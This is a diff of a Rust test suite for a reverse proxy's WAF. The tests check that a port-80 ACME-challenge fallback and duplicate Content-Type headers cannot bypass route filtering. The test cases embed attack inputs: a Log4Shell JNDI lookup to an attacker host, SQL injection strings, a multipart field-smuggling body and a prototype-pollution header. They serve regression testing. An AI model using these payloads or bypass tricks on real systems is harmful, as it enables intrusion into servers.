@@ -1850,8 +1850,10 @@ async fn a_trusted_proxy_peer_keeps_its_headers() {
 #[tokio::test]
 async fn the_port_80_acme_fallback_strips_them_too() {
     let (o, st) = rig("").await;
+    let mut headers = hostile_headers();
+    headers.push(("host", "example.test"));
     let resp = crate::accept::handle_http(
-        get("/.well-known/acme-challenge/tok", &hostile_headers()),
+        get("/.well-known/acme-challenge/tok", &headers),
         st.clone(),
         "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
     )
@@ -1878,7 +1880,7 @@ async fn the_port_80_acme_fallback_forwards_no_path_the_route_refuses() {
         "/.well-known/acme-challenge/tok;x",
     ] {
         let resp = crate::accept::handle_http(
-            get(p, &[]),
+            get(p, &[("host", "example.test")]),
             st.clone(),
             "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
         )
@@ -2019,7 +2021,11 @@ async fn the_port_80_acme_fallback_applies_the_header_policy_too() {
     let resp = crate::accept::handle_http(
         get(
             "/.well-known/acme-challenge/tok",
-            &[("x-middleware-subrequest", "middleware"), ("x-debug", "1")],
+            &[
+                ("host", "example.test"),
+                ("x-middleware-subrequest", "middleware"),
+                ("x-debug", "1"),
+            ],
         ),
         st.clone(),
         "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
@@ -2031,7 +2037,10 @@ async fn the_port_80_acme_fallback_applies_the_header_policy_too() {
     assert_eq!(seen(&o, "x-middleware-subrequest"), None);
     assert_eq!(seen(&o, "x-debug"), None);
     let resp = crate::accept::handle_http(
-        get("/.well-known/acme-challenge/tok", &[("__proto__", "x")]),
+        get(
+            "/.well-known/acme-challenge/tok",
+            &[("host", "example.test"), ("__proto__", "x")],
+        ),
         st.clone(),
         "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
     )
@@ -5521,4 +5530,573 @@ upstream = "a"
     assert_eq!(status(st.clone(), "193.205.0.1").await, 200);
     // One /24 further the table still answers.
     assert_eq!(status(st.clone(), "193.205.1.1").await, 403);
+}
+
+// ── the :80 ACME fallback forwards nothing the HTTPS pipeline would refuse ──
+
+/// What a recording origin saw: (method, path and query, body length).
+type Seen = Arc<Mutex<Vec<(String, String, usize)>>>;
+
+/// An origin that reads every body whole and records what reached it.
+async fn recording_origin() -> (u16, Seen) {
+    let seen: Seen = Arc::new(Mutex::new(Vec::new()));
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let port = listener.local_addr().unwrap().port();
+    let s = seen.clone();
+    tokio::spawn(async move {
+        loop {
+            let Ok((stream, _)) = listener.accept().await else {
+                return;
+            };
+            let s = s.clone();
+            tokio::spawn(async move {
+                let svc = hyper::service::service_fn(move |req: Request<hyper::body::Incoming>| {
+                    let s = s.clone();
+                    async move {
+                        let method = req.method().to_string();
+                        let target = req
+                            .uri()
+                            .path_and_query()
+                            .map(|p| p.as_str().to_string())
+                            .unwrap_or_default();
+                        let len = req
+                            .into_body()
+                            .collect()
+                            .await
+                            .map(|b| b.to_bytes().len())
+                            .unwrap_or(usize::MAX);
+                        s.lock().unwrap().push((method, target, len));
+                        Ok::<_, std::convert::Infallible>(Response::new(Full::new(
+                            Bytes::from_static(b"upstream"),
+                        )))
+                    }
+                });
+                let _ = hyper::server::conn::http1::Builder::new()
+                    .serve_connection(TokioIo::new(stream), svc)
+                    .await;
+            });
+        }
+    });
+    (port, seen)
+}
+
+/// A request to `api.example.com` with `method`, an optional content type and a body (with its
+/// `Content-Length` when it is not empty).
+fn api_request(method: &str, uri: &str, ct: Option<&str>, body: Vec<u8>) -> Request<ReqBody> {
+    let mut b = Request::builder()
+        .method(Method::from_bytes(method.as_bytes()).unwrap())
+        .uri(uri)
+        .header("host", "api.example.com");
+    if let Some(ct) = ct {
+        b = b.header("content-type", ct);
+    }
+    if !body.is_empty() {
+        b = b.header("content-length", body.len().to_string());
+    }
+    b.body(Full::new(Bytes::from(body)).map_err(|n| match n {}).boxed())
+        .unwrap()
+}
+
+/// A state with `rest` after the listeners and TLS, `{port}` in it replaced by `port`.
+fn acme_state(port: u16, rest: &str) -> Arc<AppState> {
+    let toml = format!(
+        "[server]\nlisten_http = \"127.0.0.1:0\"\nlisten_https = \"127.0.0.1:0\"\n\
+         [tls]\ncert_path = \"/c\"\nkey_path = \"/k\"\n{}",
+        rest.replace("{port}", &port.to_string())
+    );
+    AppState::for_tests(&toml::from_str::<ZionConfig>(&toml).expect("config parses"))
+}
+
+/// What the upstream received for one request: (method, path and query, body length).
+type Reached = Option<(String, String, usize)>;
+
+/// The status the :80 handler answers `req` with, and what the upstream received for it.
+async fn via_port_80(st: &Arc<AppState>, seen: &Seen, req: Request<ReqBody>) -> (u16, Reached) {
+    let before = seen.lock().unwrap().len();
+    let peer = "203.0.113.9:1".parse::<SocketAddr>().unwrap();
+    let resp = crate::accept::handle_http(req, st.clone(), peer)
+        .await
+        .unwrap();
+    let status = resp.status().as_u16();
+    let _ = resp.into_body().collect().await;
+    (status, seen.lock().unwrap().get(before).cloned())
+}
+
+/// The status the HTTPS pipeline answers `req` with, and what the upstream received for it.
+async fn via_pipeline(st: &Arc<AppState>, seen: &Seen, req: Request<ReqBody>) -> (u16, Reached) {
+    let before = seen.lock().unwrap().len();
+    let peer = "203.0.113.9:1".parse::<SocketAddr>().unwrap();
+    let resp = process_request(req, st.clone(), peer, false).await.unwrap();
+    let status = resp.status().as_u16();
+    let _ = resp.into_body().collect().await;
+    (status, seen.lock().unwrap().get(before).cloned())
+}
+
+/// The plaintext :80 ACME-challenge fallback (`accept::handle_http`) forwards a challenge path
+/// with no live token to the matched route's upstream, outside the HTTPS pipeline. A route with
+/// a WAF profile or restrictions must not be reached that way: the request is redirected to
+/// HTTPS, where they apply. The route is the shipped `examples/multi-site.toml` api route
+/// (host-bound catch-all, `waf_profile = "strict"`, CORS, no auth), plus `methods = ["GET",
+/// "POST"]` and a 1 MiB body cap in the profile.
+///
+/// Each case is first sent through the HTTPS pipeline, which must refuse it (the control: the
+/// payload IS something this route blocks), then through the :80 handler, which must redirect
+/// it and never forward it. Before the fix all six reached the upstream with a 200.
+#[tokio::test]
+async fn the_port_80_acme_fallback_does_not_skip_the_route_waf_and_restrictions() {
+    let (port, seen) = recording_origin().await;
+    let st = acme_state(
+        port,
+        r#"
+[upstreams]
+api = "http://127.0.0.1:{port}"
+
+[waf_profile.strict]
+max_body_mb = 1
+max_depth = 10
+deny_unknown_content_types = true
+
+[[route]]
+hosts = ["api.example.com"]
+path = "/{*rest}"
+upstream = "api"
+waf_profile = "strict"
+methods = ["GET", "POST"]
+cors = { allowed_origins = ["https://app.example.com"], allowed_headers = ["Content-Type", "Authorization"], max_age = 86400 }
+"#,
+    );
+
+    let mut json_big = b"{\"k\":\"".to_vec();
+    json_big.extend_from_slice(&vec![b'a'; 2 * 1024 * 1024]);
+    json_big.extend_from_slice(b"\"}");
+    #[allow(clippy::type_complexity)]
+    let cases: Vec<(&str, &str, &str, Option<&str>, Vec<u8>)> = vec![
+        (
+            "WAF: Log4Shell in the query",
+            "GET",
+            "/.well-known/acme-challenge/x?q=%24%7Bjndi:ldap://attacker.example/a%7D",
+            None,
+            vec![],
+        ),
+        (
+            "WAF: SQLi in the query",
+            "GET",
+            "/.well-known/acme-challenge/x?id=1%27%20OR%201=1--",
+            None,
+            vec![],
+        ),
+        (
+            "WAF: SQLi body with a content type the profile refuses",
+            "POST",
+            "/.well-known/acme-challenge/x",
+            Some("text/plain"),
+            b"id=1' OR 1=1-- ".to_vec(),
+        ),
+        (
+            "WAF body cap: 2 MiB JSON over max_body_mb = 1",
+            "POST",
+            "/.well-known/acme-challenge/x",
+            Some("application/json"),
+            json_big,
+        ),
+        (
+            "route restriction: DELETE, methods = [GET, POST]",
+            "DELETE",
+            "/.well-known/acme-challenge/x",
+            None,
+            vec![],
+        ),
+        (
+            "global method whitelist: TRACE",
+            "TRACE",
+            "/.well-known/acme-challenge/x",
+            None,
+            vec![],
+        ),
+    ];
+
+    let mut leaks = Vec::new();
+    for (label, method, uri, ct, body) in cases {
+        let req = api_request(method, uri, ct, body.clone());
+        let (s443, reached) = via_pipeline(&st, &seen, req).await;
+        assert!(
+            s443 >= 400 && reached.is_none(),
+            "control failed for {label}: :443 answered {s443} or forwarded it"
+        );
+        let (s80, reached) = via_port_80(&st, &seen, api_request(method, uri, ct, body)).await;
+        if s80 != 301 || reached.is_some() {
+            leaks.push(format!(
+                "{label}: :443 refused with {s443}; :80 answered {s80}, the upstream received \
+                 {reached:?}"
+            ));
+        }
+    }
+    assert!(
+        leaks.is_empty(),
+        "the :80 ACME fallback let through {} request(s) the route refuses on :443:\n  {}",
+        leaks.len(),
+        leaks.join("\n  ")
+    );
+}
+
+/// An HTTP-01 validation is a GET with no body (RFC 8555 §8.3). On a route with nothing to
+/// bypass the shortcut forwards that, and a HEAD, and nothing else: another method or a body is
+/// redirected to HTTPS, so the method whitelist and the body cap of a route without a WAF are
+/// not skipped either.
+#[tokio::test]
+async fn the_port_80_acme_fallback_forwards_only_a_bodyless_get_or_head() {
+    let (port, seen) = recording_origin().await;
+    let st = acme_state(
+        port,
+        r#"
+[upstreams]
+api = "http://127.0.0.1:{port}"
+
+[[route]]
+path = "/{*rest}"
+upstream = "api"
+max_body_mb = 1
+"#,
+    );
+    let p = "/.well-known/acme-challenge/tok";
+
+    // forwarded: what a CA sends
+    for method in ["GET", "HEAD"] {
+        let (status, reached) = via_port_80(&st, &seen, api_request(method, p, None, vec![])).await;
+        assert_eq!(status, 200, "{method}");
+        assert_eq!(
+            reached,
+            Some((method.to_string(), p.to_string(), 0)),
+            "{method}"
+        );
+    }
+
+    // control: on :443 the pipeline refuses these two
+    let big = vec![b'a'; 2 * 1024 * 1024];
+    let json = Some("application/json");
+    let (s, _) = via_pipeline(&st, &seen, api_request("POST", p, json, big.clone())).await;
+    assert_eq!(s, 413, "control: the body cap");
+    let (s, _) = via_pipeline(&st, &seen, api_request("TRACE", p, None, vec![])).await;
+    assert_eq!(s, 405, "control: the method whitelist");
+
+    // redirected, never forwarded
+    let cases: Vec<(&str, Option<&str>, Vec<u8>)> = vec![
+        ("POST", json, big),
+        ("POST", json, b"{}".to_vec()),
+        ("GET", json, b"{}".to_vec()),
+        ("HEAD", json, b"{}".to_vec()),
+        ("PUT", None, vec![]),
+        ("PATCH", None, vec![]),
+        ("DELETE", None, vec![]),
+        ("OPTIONS", None, vec![]),
+        ("TRACE", None, vec![]),
+    ];
+    for (method, ct, body) in cases {
+        let n = body.len();
+        let (status, reached) = via_port_80(&st, &seen, api_request(method, p, ct, body)).await;
+        assert_eq!(
+            (status, reached),
+            (301, None),
+            "{method} with a {n}-byte body must be redirected, not forwarded"
+        );
+    }
+
+    // A body of unknown length (chunked on HTTP/1, no size hint), on a GET and a HEAD.
+    for method in ["GET", "HEAD"] {
+        let frames = tokio_stream::iter([Ok::<_, crate::http_util::BoxError>(
+            hyper::body::Frame::data(Bytes::from_static(b"{}")),
+        )]);
+        let req = Request::builder()
+            .method(Method::from_bytes(method.as_bytes()).unwrap())
+            .uri(p)
+            .header("host", "api.example.com")
+            .body(http_body_util::StreamBody::new(frames).boxed())
+            .unwrap();
+        assert_eq!(
+            via_port_80(&st, &seen, req).await,
+            (301, None),
+            "{method} with a body of unknown length must be redirected, not forwarded"
+        );
+    }
+}
+
+/// The virtual patches (#698) apply to every route, so the shortcut runs them: a request one
+/// of them blocks on :443 is blocked on :80 too, and never reaches the upstream.
+#[tokio::test]
+async fn the_port_80_acme_fallback_runs_the_virtual_patches() {
+    let (port, seen) = recording_origin().await;
+    let st = acme_state(
+        port,
+        r#"
+[virtual_patch]
+enabled = true
+
+[upstreams]
+api = "http://127.0.0.1:{port}"
+
+[[route]]
+path = "/{*rest}"
+upstream = "api"
+"#,
+    );
+    // the rules a `rules_file` would load
+    let rules = crate::virtual_patch::VirtualPatchRules::from_toml_str(
+        "[[rule]]\nid='acme-x-evil'\ncve='CVE-2099-1'\naction='deny'\nmethods=['GET']\n\
+         path_glob='/.well-known/acme-challenge/*'\n[[rule.headers]]\nname='x-evil'\n",
+    )
+    .unwrap();
+    st.virtual_patch.store(Arc::new(rules));
+    let p = "/.well-known/acme-challenge/tok";
+    let evil = || {
+        let mut r = api_request("GET", p, None, vec![]);
+        r.headers_mut().insert("x-evil", "1".parse().unwrap());
+        r
+    };
+    assert_eq!(
+        via_pipeline(&st, &seen, evil()).await,
+        (403, None),
+        "control on :443"
+    );
+    assert_eq!(via_port_80(&st, &seen, evil()).await, (403, None), ":80");
+    // and a request the rule does not match is still forwarded
+    let (status, reached) = via_port_80(&st, &seen, api_request("GET", p, None, vec![])).await;
+    assert_eq!((status, reached.map(|r| r.1)), (200, Some(p.to_string())));
+}
+
+/// Even a plain challenge GET is left to the HTTPS pipeline (redirected, never forwarded) when
+/// the route has something the shortcut does not run: restrictions (`methods`, `content_types`,
+/// `deny_paths`), a WAF (`waf = true` or a `waf_profile`), or an upstream with a bulkhead
+/// (`max_in_flight`) or a circuit breaker (the shortcut has no admission stage). The same
+/// request on the same route without the setting is forwarded (the control).
+#[tokio::test]
+async fn the_port_80_acme_fallback_leaves_a_route_with_something_to_bypass_to_https() {
+    let (port, seen) = recording_origin().await;
+    let breaker = "circuit_breaker = { error_rate_pct = 50, min_requests = 5, window_secs = 10, \
+                   open_secs = 30 }";
+    let p = "/.well-known/acme-challenge/tok";
+    let mut leaks = Vec::new();
+    for (what, upstream, route) in [
+        ("control", "", ""),
+        ("methods", "", "methods = [\"POST\"]"),
+        (
+            "content_types",
+            "",
+            "content_types = [\"application/json\"]",
+        ),
+        ("deny_paths", "", "deny_paths = [\"/.well-known/{*rest}\"]"),
+        ("waf", "", "waf = true"),
+        (
+            "waf_profile",
+            "",
+            "waf_profile = \"w\"\n[waf_profile.w]\nmax_body_mb = 1",
+        ),
+        ("max_in_flight", "max_in_flight = 4", ""),
+        ("circuit_breaker", breaker, ""),
+    ] {
+        let st = acme_state(
+            port,
+            &format!(
+                "[upstream.api]\nurl = \"http://127.0.0.1:{{port}}\"\n{upstream}\n\
+                 [[route]]\npath = \"/{{*rest}}\"\nupstream = \"api\"\n{route}\n"
+            ),
+        );
+        let (status, reached) = via_port_80(&st, &seen, api_request("GET", p, None, vec![])).await;
+        if what == "control" {
+            assert_eq!((status, reached.is_some()), (200, true), "{what}");
+        } else if (status, &reached) != (301, &None) {
+            leaks.push(format!(
+                "{what}: {status}, the upstream received {reached:?}"
+            ));
+        }
+    }
+    assert!(leaks.is_empty(), "\n  {}", leaks.join("\n  "));
+}
+
+/// The TLS listener answers `400` to an HTTP/1.1 request without exactly one valid `Host`
+/// (RFC 9112 §3.2, `accept::http1_host_is_wrong`), before routing. The shortcut used to forward
+/// such a challenge `GET`: routed on the first line or on no host at all, with the client's value
+/// sent upstream as `X-Forwarded-Host` (measured on the real binary: `:443` 400, `:80` 200 from
+/// the upstream). It is now redirected, or refused with 400 by the :80 authority checks, never
+/// forwarded. The controls: one valid `Host` is
+/// forwarded, and so is an HTTP/1.0 request without one, which the TLS listener serves too.
+#[tokio::test]
+async fn the_port_80_acme_fallback_takes_only_a_host_the_tls_listener_accepts() {
+    let (port, seen) = recording_origin().await;
+    let st = acme_state(
+        port,
+        "[upstreams]\napi = \"http://127.0.0.1:{port}\"\n\
+         [[route]]\npath = \"/{*rest}\"\nupstream = \"api\"\n",
+    );
+    let p = "/.well-known/acme-challenge/tok";
+    let req = |version: hyper::Version, hosts: &[&str]| {
+        let mut b = Request::builder().version(version).uri(p);
+        for h in hosts {
+            b = b.header("host", *h);
+        }
+        b.body(Full::new(Bytes::new()).map_err(|n| match n {}).boxed())
+            .unwrap()
+    };
+    let (h10, h11) = (hyper::Version::HTTP_10, hyper::Version::HTTP_11);
+    for (what, version, hosts) in [
+        ("one valid Host", h11, &["api.example.com"][..]),
+        ("HTTP/1.0 without Host", h10, &[]),
+    ] {
+        let (status, reached) = via_port_80(&st, &seen, req(version, hosts)).await;
+        assert_eq!(
+            (status, reached.map(|r| r.1)),
+            (200, Some(p.to_string())),
+            "control: {what}"
+        );
+    }
+    let mut leaks = Vec::new();
+    // A Host with userinfo or one that is not a host name is answered 400 by the :80 handler's
+    // own authority checks before the shortcut; the rest is redirected. Neither is forwarded.
+    for (what, hosts, want) in [
+        ("no Host", &[][..], 301),
+        ("two Host lines", &["api.example.com", "other.example"], 301),
+        ("Host x@api.example.com", &["x@api.example.com"], 400),
+        ("Host 'exa mple.com'", &["exa mple.com"], 400),
+    ] {
+        let (status, reached) = via_port_80(&st, &seen, req(h11, hosts)).await;
+        if (status, &reached) != (want, &None) {
+            leaks.push(format!(
+                "{what}: {status}, the upstream received {reached:?}"
+            ));
+        }
+    }
+    assert!(leaks.is_empty(), "\n  {}", leaks.join("\n  "));
+}
+
+// ── WAF: one Content-Type per body ──────────────────────────────────────────
+
+/// Content-Type is a singleton field, but a request can carry two lines of it, and zion forwards
+/// both. The multipart gate reads the first; gunicorn 23 hands the app the last (measured with
+/// Werkzeug 3.1.9 behind it: the app got boundary `B` and the denied field). So a WAF route
+/// refuses a body with more than one Content-Type, in either order, before the upstream.
+#[tokio::test]
+async fn a_body_with_two_content_types_is_refused_before_the_upstream() {
+    let (port, seen) = recording_origin().await;
+    let st = acme_state(
+        port,
+        r#"
+[upstreams]
+api = "http://127.0.0.1:{port}"
+
+[waf_profile.forms]
+deny_field_names = ["PHP_SESSION_UPLOAD_PROGRESS"]
+max_file_parts = 0
+
+[[route]]
+path = "/{*rest}"
+upstream = "api"
+waf_profile = "forms"
+"#,
+    );
+    // One part `a` under boundary Z; under boundary B, the denied field.
+    let body = b"--Z\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n\r\n--B\r\n\
+                 Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nx\
+                 \r\n--B--\r\n\r\n--Z--\r\n";
+    let z = "multipart/form-data; boundary=Z";
+    let b = "multipart/form-data; boundary=B";
+    let req = |cts: &[&str], body: &[u8]| {
+        let mut r = Request::builder()
+            .method(Method::POST)
+            .uri("/upload")
+            .header("host", "api.example.com")
+            .header("content-length", body.len().to_string());
+        for ct in cts {
+            r = r.header("content-type", *ct);
+        }
+        r.body(
+            Full::new(Bytes::copy_from_slice(body))
+                .map_err(|n| match n {})
+                .boxed(),
+        )
+        .unwrap()
+    };
+    // controls: the gate allows the body under Z and refuses it under B
+    let (status, reached) = via_pipeline(&st, &seen, req(&[z], body)).await;
+    assert_eq!(
+        (status, reached.map(|r| r.2)),
+        (200, Some(body.len())),
+        "control: one part under Z"
+    );
+    assert_eq!(
+        via_pipeline(&st, &seen, req(&[b], body)).await,
+        (400, None),
+        "control: the denied field under B"
+    );
+    for cts in [[z, b], [b, z], [z, z]] {
+        assert_eq!(
+            via_pipeline(&st, &seen, req(&cts, body)).await,
+            (400, None),
+            "{cts:?}"
+        );
+    }
+    // a bodyless request has nothing for either line to label
+    let (status, reached) = via_pipeline(&st, &seen, req(&[z, b], b"")).await;
+    assert_eq!((status, reached.map(|r| r.2)), (200, Some(0)), "empty body");
+}
+
+/// The same rule on a route's `content_types` (#693), which reads the request before the WAF and
+/// needs none. `Content-Type: application/json` then `Content-Type: multipart/form-data` passed
+/// `content_types = ["application/json"]` on the first line, and gunicorn 23 handed the app the
+/// second (measured with Werkzeug 3.1.9 behind it: the app read the multipart form). A body with
+/// more than one Content-Type line is refused with the route's `415`, before the upstream.
+#[tokio::test]
+async fn a_route_with_content_types_refuses_a_body_with_two_content_types_before_the_upstream() {
+    let (port, seen) = recording_origin().await;
+    let st = acme_state(
+        port,
+        r#"
+[upstreams]
+api = "http://127.0.0.1:{port}"
+
+[[route]]
+path = "/{*rest}"
+upstream = "api"
+content_types = ["application/json"]
+"#,
+    );
+    let json = "application/json";
+    let multipart = "multipart/form-data; boundary=B";
+    let form = b"--B\r\nContent-Disposition: form-data; name=\"hidden\"\r\n\r\nx\r\n--B--\r\n";
+    let req = |cts: &[&str], body: &[u8]| {
+        let mut r = Request::builder()
+            .method(Method::POST)
+            .uri("/api")
+            .header("host", "api.example.com")
+            .header("content-length", body.len().to_string());
+        for ct in cts {
+            r = r.header("content-type", *ct);
+        }
+        r.body(
+            Full::new(Bytes::copy_from_slice(body))
+                .map_err(|n| match n {})
+                .boxed(),
+        )
+        .unwrap()
+    };
+    // controls: a JSON body under the JSON line alone is forwarded, the form alone is refused
+    let (status, reached) = via_pipeline(&st, &seen, req(&[json], b"{}")).await;
+    assert_eq!(
+        (status, reached.map(|r| r.2)),
+        (200, Some(2)),
+        "control: JSON"
+    );
+    assert_eq!(
+        via_pipeline(&st, &seen, req(&[multipart], form)).await,
+        (415, None),
+        "control: the form alone"
+    );
+    for cts in [[json, multipart], [multipart, json], [json, json]] {
+        assert_eq!(
+            via_pipeline(&st, &seen, req(&cts, form)).await,
+            (415, None),
+            "{cts:?}"
+        );
+    }
+    // a bodyless request has nothing for either line to label
+    let (status, reached) = via_pipeline(&st, &seen, req(&[json, multipart], b"")).await;
+    assert_eq!((status, reached.map(|r| r.2)), (200, Some(0)), "empty body");
 }
